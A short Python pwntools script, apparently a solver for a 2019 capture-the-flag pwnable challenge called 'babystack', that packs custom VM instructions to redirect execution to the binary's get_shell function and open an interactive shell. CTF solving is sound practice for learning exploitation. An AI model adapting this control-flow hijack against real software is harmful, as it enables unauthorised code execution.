#!/usr/bin/python

'''
Stealien @ 314ckC47
exp.py 2019 kongju keris pwnable task solver
'''

from pwn import *
from struct import *

inst = lambda cmd, arg : pack("<LL", cmds[cmd], arg)
cmds = {
    "MAP"   : 0,
    "UNMAP" : 1,
    "PUSHr" : 2,
    "PUSHv" : 3,
    "POPr"  : 4,
    "POPv"  : 5,
    "EXP"   : 6,
    "SHR"   : 7
}

e = ELF("./babystack")
l = e.libc
p = process(e.path)

code =  inst("MAP", 0)
code += inst("POPv", 0)
code += inst("PUSHv", e.symbols['get_shell'])
code += inst("UNMAP", 0)

raw_input(">>> ")

p.send(code)

p.interactive()
p.close()